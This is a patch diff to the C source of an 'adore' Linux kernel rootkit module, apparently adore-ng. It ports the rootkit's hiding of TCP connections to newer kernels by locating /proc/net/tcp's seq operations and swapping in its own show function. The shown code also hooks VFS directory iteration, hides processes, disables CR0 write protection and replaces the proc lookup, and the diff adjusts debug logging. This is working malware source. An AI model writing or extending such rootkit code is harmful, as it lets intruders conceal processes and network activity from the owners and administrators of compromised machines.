@@ -427,8 +427,6 @@ int adore_root_filldir(void *buf, const char *name, int nlen, loff_t off, u64 in
 	this.hash = full_name_hash(this.name, this.len);
 	dentry  = d_lookup(dir, &this);
 	if (!dentry) {
-		printk("adore_root_filldir %s %x\n", name, dentry);
-	
 		dentry = d_alloc(dir, &this);
 		if (!dentry) {
 			return 0;
@@ -446,7 +444,7 @@ int adore_root_filldir(void *buf, const char *name, int nlen, loff_t off, u64 in
 	
 	uid = inode->i_uid PATCH_UID;
 	gid = inode->i_gid PATCH_UID;
-	printk("%s: (%d %d)\n", name, uid, gid);
+	//printk("%s: (%d %d)\n", name, uid, gid);
 	
 	//iput(inode);
 	//dput(dentry);
@@ -589,6 +587,9 @@ int unpatch_vfs(const char *p,
 #if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
 	new_op->readdir = orig_readdir;
 #else
+	printk("unatch starting, %x --> %x\n",
+		(unsigned)new_op->iterate,
+		(unsigned)orig_iterate);
 	new_op->iterate = orig_iterate;
 #endif
 		
@@ -657,17 +658,32 @@ void kobject_unregister(struct kobject * kobj)
 }
 #endif
 
-#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
-struct proc_dir_entry *proc_find_tcp(void)
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
+struct tcp_seq_afinfo *proc_find_tcp_seq(void)
 {
-	struct proc_dir_entry *p = init_net.proc_net->subdir;
+	struct proc_dir_entry *pde = init_net.proc_net->subdir;
 
-	while (strcmp(p->name, "tcp"))
-		p = p->next;
-	return p;
+	while (strcmp(pde->name, "tcp"))
+		pde = pde->next;
+
+	return (struct tcp_seq_afinfo*)pde->data;
+}
+#else
+struct tcp_seq_afinfo *proc_find_tcp_seq(void)
+{
+	struct file *filep;
+
+	filep = filp_open("/proc/net/tcp", O_RDONLY, 0);
+	printk("filp_open %x\n", filep);
+	if(!filep) return NULL;
+	
+	struct tcp_seq_afinfo *afinfo = PDE_DATA(filep->f_dentry->d_inode);
+	printk("inode %x afinfo %x\n", filep->f_dentry->d_inode, afinfo);
+	filp_close(filep, 0);
+	
+	return afinfo;
 }
 #endif
-
 #define NET_CHUNK 150
 
 int (*orig_tcp4_seq_show)(struct seq_file*, void *) = NULL;
@@ -776,6 +792,8 @@ static int patch_syslog(void)
 }
 #endif
 
+struct tcp_seq_afinfo *t_afinfo = NULL;
+
 int __init adore_init(void)
 {
 	struct file_operations *new_op;
@@ -784,14 +802,11 @@ int __init adore_init(void)
 	struct file *filep;
 	struct list_head *m = NULL, *p = NULL, *n = NULL;
 	struct module *me = NULL;
-	struct proc_dir_entry *pde = NULL;
-	struct tcp_seq_afinfo *t_afinfo = NULL;
 	
 	memset(hidden_procs, 0, sizeof(hidden_procs));
 
     filep = filp_open(proc_fs, O_RDONLY|O_DIRECTORY, 0);
 	if (IS_ERR(filep)) {
-		printk("failed to open proc\n");
 		return -1;
 	}
 	
@@ -813,15 +828,12 @@ int __init adore_init(void)
 		patch_vfs(opt_fs, &orig_opt_iterate, adore_opt_iterate);
 #endif
 				  
-#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
-	pde = proc_find_tcp();
-	t_afinfo = (struct tcp_seq_afinfo*)pde->data;
+	t_afinfo = proc_find_tcp_seq();
 	if (t_afinfo) {
 		orig_tcp4_seq_show = t_afinfo->seq_ops.show;
 		t_afinfo->seq_ops.show = adore_tcp4_seq_show;
-		printk("patch proc_net: %x --> %x", orig_tcp4_seq_show, adore_tcp4_seq_show);
+		printk("patch proc_net: %x --> %x\n", orig_tcp4_seq_show, adore_tcp4_seq_show);
 	}
-#endif
 	//patch_syslog();
 
 	j = 0;
@@ -864,27 +876,21 @@ void __exit adore_cleanup(void)
 	struct file_operations *new_op;
 	struct inode_operations *new_inode_op;
 	int i = 0, j = 0;
-	struct proc_dir_entry *pde = NULL;
-	struct tcp_seq_afinfo *t_afinfo = NULL;
 	struct file *filep;
 	
-#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
-	pde = proc_find_tcp();
-	t_afinfo = (struct tcp_seq_afinfo*)pde->data;
 	if (t_afinfo && orig_tcp4_seq_show)
 	{
-		printk("unpatch proc_net: %x --> %x", t_afinfo->seq_ops.show, orig_tcp4_seq_show);
+		printk("unpatch proc_net: %x --> %x\n", t_afinfo->seq_ops.show, orig_tcp4_seq_show);
 		t_afinfo->seq_ops.show = orig_tcp4_seq_show;
 	}
-#endif
+	
+	orig_cr0 = clear_return_cr0();
 
 	filep = filp_open(proc_fs, O_RDONLY|O_DIRECTORY, 0);
 	if (IS_ERR(filep)) {
 		printk("failed to open proc\n");
         return ;
 	}
-	
-	orig_cr0 = clear_return_cr0();
 	
 	new_inode_op = (struct inode_operations *)filep->f_dentry->d_inode->i_op;
 	new_inode_op->lookup = orig_proc_lookup;
